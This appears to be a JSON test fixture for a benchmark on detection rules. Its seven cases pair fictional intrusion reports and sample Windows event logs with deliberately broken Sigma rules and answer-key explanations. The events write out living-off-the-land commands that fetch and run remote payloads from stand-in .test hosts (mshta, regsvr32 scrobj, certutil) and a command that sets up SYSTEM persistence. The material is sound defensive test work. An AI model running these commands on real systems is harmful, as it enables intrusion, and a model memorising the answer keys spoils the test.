@@ -1,0 +1,469 @@
+{
+ "cases": [
+  {
+   "assumptions": [],
+   "defect_class": "D1",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "mshta.exe \"C:\\Program Files\\Northwind HR\\help\\welcome.hta\"",
+      "image": "C:\\Windows\\System32\\mshta.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\carol"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "cmd.exe /c ipconfig /all",
+      "image": "C:\\Windows\\System32\\cmd.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "notepad.exe C:\\Users\\alice\\Documents\\notes.txt",
+      "image": "C:\\Windows\\System32\\notepad.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "mshta.exe https://cdn.harborfreight-docs.test/inv/stage1.hta",
+      "image": "C:\\Windows\\System32\\mshta.exe",
+      "kind": "process_create",
+      "parent": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "parent_cmd": "WINWORD.EXE /n C:\\Users\\bkim\\Documents\\invoice_0932.docm",
+      "user": "LAB\\bkim"
+     },
+     {
+      "cmd": "mshta.exe https://cdn.harborfreight-docs.test/inv/stage2.hta",
+      "image": "C:\\Windows\\System32\\mshta.exe",
+      "kind": "process_create",
+      "parent": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "parent_cmd": "WINWORD.EXE /n C:\\Users\\mnovak\\Documents\\statement_1187.docm",
+      "user": "LAB\\mnovak"
+     }
+    ]
+   },
+   "evidence": [
+    "mshta.exe https://cdn.harborfreight-docs.test/inv/stage1.hta",
+    "mshta.exe was invoked with a full HTTPS URL as its only argument"
+   ],
+   "expected_gate": "G1",
+   "id": "D1-01",
+   "logsource": "windows_process_creation",
+   "report_text": "During the intrusion at a regional logistics firm, a phishing attachment opened in Microsoft Word spawned Microsoft's HTML Application host to retrieve a remote payload. The process tree shows WINWORD.EXE starting mshta.exe https://cdn.harborfreight-docs.test/inv/stage1.hta on a finance workstation. The HTA held a short VBScript stub that in turn started a hidden PowerShell process. Analysts noted that mshta.exe was invoked with a full HTTPS URL as its only argument rather than a path to a local file, which is unusual for the hosts involved because the finance department has no business use for HTA applications. The identical pattern recurred on three workstations within eleven minutes, each time with a different staging filename but the same HTTPS delivery host.",
+   "role": "defective",
+   "sigma_yaml": "title: Mshta Launching Remote HTA Over HTTPS\nid: 6f3b1c2e-8a47-4d19-b0c5-2e91a7d4f830\nstatus: experimental\ndescription: Detects mshta.exe started with an HTTPS URL as its argument, as seen when a phishing macro retrieved a remote HTA payload.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.stealth\n  - attack.t1218.005\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\mshta.exe'\n  \tCommandLine|contains: 'https://'\n  condition: selection\nfalsepositives:\n  - Internal administration tools delivered as HTML applications from an intranet web server\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1218.005"
+   ],
+   "why": "One line inside the detection block is indented with a tab character, which looks identical to spaces but is forbidden for YAML indentation, so the document fails to parse. With the tab replaced by spaces the rule would be valid and fully traceable."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D1",
+   "evasive": false,
+   "events": {
+    "lookalike": [
+     {
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "dns_query",
+      "name": "packages.northwind.test"
+     },
+     {
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "dns_query",
+      "name": "update-check.cranemail.test"
+     }
+    ],
+    "negative": [
+     {
+      "image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+      "kind": "dns_query",
+      "name": "intranet.cranemail.test"
+     },
+     {
+      "image": "C:\\Windows\\System32\\svchost.exe",
+      "kind": "dns_query",
+      "name": "time.northwind.test"
+     }
+    ],
+    "positive": [
+     {
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "dns_query",
+      "name": "c2k9x7.lowtidewire.test"
+     },
+     {
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "dns_query",
+      "name": "q81mfa.lowtidewire.test"
+     }
+    ]
+   },
+   "evidence": [
+    "c2k9x7.lowtidewire.test and q81mfa.lowtidewire.test",
+    "the queries originated from powershell.exe rather than from a browser"
+   ],
+   "expected_gate": "G1",
+   "id": "D1-02",
+   "logsource": "windows_dns_query",
+   "report_text": "The implant, tracked internally as TIDEWIRE, uses DNS as its command channel. From a PowerShell host process the malware issues a rapid series of lookups for pseudo-random labels beneath a single attacker-controlled zone, for example c2k9x7.lowtidewire.test and q81mfa.lowtidewire.test. Responses carry TXT records holding tasking encoded in base32. Beaconing ran roughly every forty seconds on the three affected hosts and persisted for nine days before detection. Network defenders observed that the queries originated from powershell.exe rather than from a browser or the system resolver cache service, and that no legitimate business application used the lowtidewire.test zone. Analysts assess that the zone was registered shortly before the campaign and that the leading labels will vary per victim.",
+   "role": "defective",
+   "sigma_yaml": "title: DNS Beaconing From PowerShell To The Tidewire Zone\nid: a14d7e90-3c52-4b86-9f1a-d60e2b8c7435\nstatus: experimental\ndescription: Detects PowerShell resolving names under the lowtidewire.test zone that the TIDEWIRE implant uses as a DNS command channel.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.command_and_control\n  - attack.t1071.004\nlogsource:\n  category: dns_query\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\powershell.exe'\n    QueryName|endswith: ['.lowtidewire.test'\n  condition: selection\nfalsepositives:\n  - Authorised red team exercises that deliberately resolve the zone\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1071.004"
+   ],
+   "why": "The flow sequence opened with '[' on the QueryName|endswith line is never closed, so the following block-style keys sit inside an unterminated flow collection and the document is not well-formed YAML."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D1",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "dest_ip": "192.0.2.80",
+      "dest_port": "443",
+      "image": "C:\\Windows\\System32\\rundll32.exe",
+      "kind": "network_connect"
+     },
+     {
+      "dest_ip": "203.0.113.30",
+      "dest_port": "4782",
+      "image": "C:\\Program Files\\Northwind\\Sync\\nwsync.exe",
+      "kind": "network_connect"
+     }
+    ],
+    "negative": [
+     {
+      "dest_ip": "203.0.113.10",
+      "dest_port": "443",
+      "image": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
+      "kind": "network_connect"
+     },
+     {
+      "dest_ip": "192.0.2.25",
+      "dest_port": "993",
+      "image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
+      "kind": "network_connect"
+     }
+    ],
+    "positive": [
+     {
+      "dest_ip": "198.51.100.77",
+      "dest_port": "4782",
+      "image": "C:\\Windows\\System32\\rundll32.exe",
+      "kind": "network_connect"
+     },
+     {
+      "dest_ip": "198.51.100.77",
+      "dest_port": "4782",
+      "image": "C:\\Windows\\SysWOW64\\rundll32.exe",
+      "kind": "network_connect"
+     }
+    ]
+   },
+   "evidence": [
+    "rundll32.exe opened an outbound TCP connection to 198.51.100.77 on port 4782",
+    "Port 4782 is not used by any approved application in the victim network"
+   ],
+   "expected_gate": "G1",
+   "id": "D1-03",
+   "logsource": "windows_network_connection",
+   "report_text": "Incident responders recovered a loader that executes as a DLL under rundll32.exe and calls home without using any standard web port. In the three confirmed infections, rundll32.exe opened an outbound TCP connection to 198.51.100.77 on port 4782 roughly every five minutes and then exchanged short binary frames that resembled neither HTTP nor TLS. Port 4782 is not used by any approved application in the victim network, and the egress firewall permitted the traffic only because its ruleset allowed high ports outbound by default. The same loader build used port 4782 on every host, and it slept for long, irregular intervals between connections. Responders recommend alerting on rundll32.exe network activity toward non-standard ports.",
+   "role": "defective",
+   "sigma_yaml": "title: Rundll32 Connecting Out On A Non-Standard Port\nid: c9e8a1f7-52d4-4e3b-8a6c-1f0b7d93e248\nstatus: experimental\ndescription: Detects rundll32.exe opening an outbound connection to port 4782, a port no approved application uses, as seen with a DLL loader that avoids standard web ports.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.command_and_control\n  - attack.t1571\nlogsource:\n  category: network_connection\n  product: windows\ndetection:\n  selection_rundll32:\n    Image|endswith: '\\rundll32.exe'\n    DestinationPort: '4782'\n  condition: selection_rundl32\nfalsepositives:\n  - Vendor software that legitimately runs inside rundll32.exe and uses the same port\nlevel: medium\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1571"
+   ],
+   "why": "The condition names selection_rundl32 but the only selection defined is selection_rundll32 (one 'l' fewer), so the condition refers to an undefined identifier and a Sigma parser cannot compile the rule. The YAML itself is well-formed and every other element is valid."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D1",
+   "evasive": false,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "schtasks.exe /create /tn NorthwindBackup /tr \"C:\\Program Files\\Northwind\\backup.exe\" /sc daily /st 02:00 /ru SYSTEM",
+      "image": "C:\\Windows\\System32\\schtasks.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\backupadmin"
+     },
+     {
+      "cmd": "schtasks.exe /create /tn TeamsAutoStart /tr \"C:\\Program Files\\Teams\\teams.exe\" /sc onlogon",
+      "image": "C:\\Windows\\System32\\schtasks.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\dave"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "tasklist.exe /v",
+      "image": "C:\\Windows\\System32\\tasklist.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "ping.exe -n 2 files.northwind.test",
+      "image": "C:\\Windows\\System32\\PING.EXE",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "schtasks.exe /create /tn \"Microsoft\\Windows\\WinSAT\\WinSATUpdate\" /tr \"C:\\Users\\Public\\Libraries\\wsupd.exe\" /sc onlogon /ru SYSTEM",
+      "image": "C:\\Windows\\System32\\schtasks.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\svc_helpdesk"
+     },
+     {
+      "cmd": "schtasks.exe /create /tn \"Microsoft\\Windows\\Maintenance\\MaintCheck\" /tr \"C:\\Users\\Public\\Libraries\\mchk.exe\" /sc onlogon /ru SYSTEM /f",
+      "image": "C:\\Windows\\System32\\schtasks.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\svc_helpdesk"
+     }
+    ]
+   },
+   "evidence": [
+    "schtasks.exe /create /tn",
+    "/sc onlogon /ru SYSTEM",
+    "Because the task runs as SYSTEM at every logon"
+   ],
+   "expected_gate": "G1",
+   "id": "D1-04",
+   "logsource": "windows_process_creation",
+   "report_text": "In the second stage of the intrusion the operator established persistence on each pivot host with a scheduled task that masquerades as a Windows maintenance job. The task was registered from an interactive command prompt with the command schtasks.exe /create /tn \"Microsoft\\Windows\\WinSAT\\WinSATUpdate\" /tr \"C:\\Users\\Public\\Libraries\\wsupd.exe\" /sc onlogon /ru SYSTEM and it points at an executable dropped into the Public Libraries folder. Because the task runs as SYSTEM at every logon, the implant survived reboots and profile resets. Defenders should note that the task name imitates a built-in WinSAT task, while the genuine WinSAT tasks are never configured to launch binaries from user-writable directories. Registration occurred within two minutes of the first remote shell on all four hosts.",
+   "role": "defective",
+   "sigma_yaml": "title: Scheduled Task Created To Run At Logon As SYSTEM\nid: 2d7f9b34-e1a6-4c58-b3d2-7a95c0e4f816\nstatus: experimental\ndescription: Detects schtasks.exe creating a task that runs at logon as SYSTEM, the persistence pattern seen on pivot hosts.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.execution\n  - attack.persistence\n  - attack.privilege_escalation\n  - attack.t1053.005\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  - selection:\n      Image|endswith: '\\schtasks.exe'\n      CommandLine|contains|all:\n        - '/create'\n        - '/sc onlogon'\n        - '/ru system'\n  - condition: selection\nfalsepositives:\n  - Software installers that register a SYSTEM logon task during setup\nlevel: medium\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1053.005"
+   ],
+   "why": "The detection key is a YAML list of single-key maps instead of a mapping of named selections plus a condition. It parses as YAML but violates the Sigma schema, which requires detection to be a mapping."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D1",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "dest_ip": "198.51.100.200",
+      "dest_port": "443",
+      "image": "C:\\Program Files\\HelpBridge\\hbridge.exe",
+      "kind": "network_connect"
+     },
+     {
+      "dest_ip": "198.51.100.201",
+      "dest_port": "8443",
+      "image": "C:\\Program Files\\HelpBridge\\hbridge.exe",
+      "kind": "network_connect"
+     }
+    ],
+    "negative": [
+     {
+      "dest_ip": "192.0.2.44",
+      "dest_port": "443",
+      "image": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
+      "kind": "network_connect"
+     },
+     {
+      "dest_ip": "198.51.100.5",
+      "dest_port": "443",
+      "image": "C:\\Windows\\System32\\svchost.exe",
+      "kind": "network_connect"
+     }
+    ],
+    "positive": [
+     {
+      "dest_ip": "203.0.113.64",
+      "dest_port": "7799",
+      "image": "C:\\ProgramData\\Intel\\hbridge.exe",
+      "kind": "network_connect"
+     },
+     {
+      "dest_ip": "203.0.113.64",
+      "dest_port": "7799",
+      "image": "C:\\Users\\Public\\hbridge.exe",
+      "kind": "network_connect"
+     }
+    ]
+   },
+   "evidence": [
+    "hbridge.exe opened a long-lived outbound connection to the relay at 203.0.113.64 on port 7799",
+    "the sanctioned HelpBridge deployment on the help desk subnet"
+   ],
+   "expected_gate": "G1",
+   "id": "D1-05",
+   "logsource": "windows_network_connection",
+   "report_text": "The intruders installed a portable build of the commercial remote support client HelpBridge to retain interactive access after their first implant was removed. The binary, hbridge.exe, was copied into C:\\ProgramData\\Intel and started under a compromised service account. On every host hbridge.exe opened a long-lived outbound connection to the relay at 203.0.113.64 on port 7799, which differs from the default port 443 used by the sanctioned HelpBridge deployment on the help desk subnet. Analysts believe the operators chose the relay port to blend with unrelated high-port traffic. Because the product is legitimate and signed, antivirus raised no alert, and the sessions were only discovered when the relay address appeared in an upstream firewall review.",
+   "role": "defective",
+   "sigma_yaml": "title: Remote Support Client Connecting To Relay On Non-Default Port\nid: 8b60e3d2-f947-4a1c-a5d8-3c7e19b2046f\nstatus: experimental\ndescription: Detects the HelpBridge remote support client hbridge.exe connecting to a relay on port 7799 instead of the sanctioned default port.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags: attack.command_and_control, attack.t1219\nlogsource:\n  category: network_connection\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\hbridge.exe'\n    DestinationPort: '7799'\n  condition: selection\nfalsepositives:\n  - Sanctioned HelpBridge deployments reconfigured to use the relay port\nlevel: medium\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1219"
+   ],
+   "why": "The tags key is a single comma-separated string instead of a list of strings, which violates the Sigma schema even though the YAML parses and a text search for the tag names still succeeds."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D1",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "regsvr32.exe /s \"C:\\Program Files\\Northwind\\Shell\\nwshell.dll\"",
+      "image": "C:\\Windows\\System32\\regsvr32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\msiexec.exe",
+      "parent_cmd": "msiexec.exe /i nwshell.msi",
+      "user": "NT AUTHORITY\\SYSTEM"
+     },
+     {
+      "cmd": "regsvr32.exe /u /s C:\\Windows\\System32\\oldcodec.dll",
+      "image": "C:\\Windows\\System32\\regsvr32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\itadmin"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "whoami /all",
+      "image": "C:\\Windows\\System32\\whoami.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "net.exe user",
+      "image": "C:\\Windows\\System32\\net.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "regsvr32.exe /s /n /u /i:https://files.driftmoor-cdn.test/r.sct scrobj.dll",
+      "image": "C:\\Windows\\System32\\regsvr32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\svc_build"
+     },
+     {
+      "cmd": "regsvr32.exe /s /n /u /i:https://files.driftmoor-cdn.test/ld2.sct scrobj.dll",
+      "image": "C:\\Windows\\SysWOW64\\regsvr32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\svc_build"
+     }
+    ]
+   },
+   "evidence": [
+    "regsvr32.exe /s /n /u /i:https://files.driftmoor-cdn.test/r.sct scrobj.dll",
+    "an /i: argument pointing at a web address with scrobj.dll"
+   ],
+   "expected_gate": "G1",
+   "id": "D1-06",
+   "logsource": "windows_process_creation",
+   "report_text": "After obtaining a foothold on a build server, the operator used regsvr32.exe to run a remote scriptlet and avoid dropping a payload to disk. The captured command line was regsvr32.exe /s /n /u /i:https://files.driftmoor-cdn.test/r.sct scrobj.dll, which makes the registration utility fetch the scriptlet over HTTPS and execute it through the scripting runtime library. The technique works without administrative rights and leaves no registry changes when the unregister flag is supplied. Defenders should note that legitimate use of regsvr32.exe almost always names a local DLL or OCX file, whereas this activity combined an /i: argument pointing at a web address with scrobj.dll. The operator repeated the call on two further servers using other scriptlet names.",
+   "role": "defective",
+   "sigma_yaml": "title: Regsvr32 Running A Remote Scriptlet Through Scrobj\nid: e53a0c17-9b2d-4f64-8d31-a7c4f2b95e08\nstatus: experimental\ndescription: Detects regsvr32.exe running a remote scriptlet through scrobj.dll when the install argument points at a web address.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.stealth\n  - attack.t1218.010\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\regsvr32.exe'\n    CommandLine|contains: '/i:http'\n    CommandLine|contains: 'scrobj.dll'\n  condition: selection\nfalsepositives:\n  - Software deployment tooling that registers scriptlet components from an internal web server\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1218.010"
+   ],
+   "why": "The selection mapping contains the key CommandLine|contains twice with different values. YAML requires unique mapping keys, and lenient parsers silently keep only the last one, discarding the '/i:http' constraint the author intended to AND with 'scrobj.dll'."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D1",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "image": "C:\\Windows\\System32\\certutil.exe",
+      "kind": "dns_query",
+      "name": "ca01.northwind.test"
+     },
+     {
+      "image": "C:\\Windows\\System32\\certutil.exe",
+      "kind": "dns_query",
+      "name": "crl.vendorpki.example"
+     }
+    ],
+    "negative": [
+     {
+      "image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+      "kind": "dns_query",
+      "name": "www.northwind.test"
+     },
+     {
+      "image": "C:\\Windows\\System32\\svchost.exe",
+      "kind": "dns_query",
+      "name": "time.northwind.test"
+     }
+    ],
+    "positive": [
+     {
+      "image": "C:\\Windows\\System32\\certutil.exe",
+      "kind": "dns_query",
+      "name": "dl.reedmarsh-files.test"
+     },
+     {
+      "image": "C:\\Windows\\SysWOW64\\certutil.exe",
+      "kind": "dns_query",
+      "name": "cdn.reedmarsh-files.test"
+     }
+    ]
+   },
+   "evidence": [
+    "certutil.exe asking for dl.reedmarsh-files.test just before the payload landed in the temp directory",
+    "No business application in the environment has any reason to resolve names under reedmarsh-files.test"
+   ],
+   "expected_gate": "G1",
+   "id": "D1-07",
+   "logsource": "windows_dns_query",
+   "report_text": "Responders traced the second-stage download on the compromised file server to the built-in certificate utility. certutil.exe was run with -urlcache -split -f against a staging host, and the resolver log shows certutil.exe asking for dl.reedmarsh-files.test just before the payload landed in the temp directory. The domain belongs to a commodity hosting provider and was registered four days before the intrusion. No business application in the environment has any reason to resolve names under reedmarsh-files.test, and certutil.exe normally only resolves the internal certificate authority and the vendor revocation endpoints. The operators reused the same staging name across the other two compromised hosts, so the domain suffix is a stable anchor even though the payload filename changed on each host.",
+   "role": "defective",
+   "sigma_yaml": "title: Certutil Resolving The Reedmarsh Staging Domain\nid: 17c4b8a9-d036-4e72-9a5f-b2e61d80c3f7\nstatus: experimental\ndescription: Detects certutil.exe resolving names under the reedmarsh-files.test staging domain used for ingress tool transfer.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.command_and_control\n  - attack.t1105\nlogsource:\n  category: dns_query\n  product: windows\ndetection:\n  selection_tool:\n    Image|endswith: '\\certutil.exe'\n  selection_domain:\n    QueryName|endswith: '.reedmarsh-files.test'\n  condition: selection_tool and or selection_domain\nfalsepositives:\n  - Administrators testing certificate retrieval against the hosting provider\nlevel: medium\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1105"
+   ],
+   "why": "The condition 'selection_tool and or selection_domain' has two consecutive binary operators, which is a syntax error in the Sigma condition grammar. Both selections it names are defined, so a check that only looks for the condition key or for undefined names would miss it."
+  }
+ ]
+}
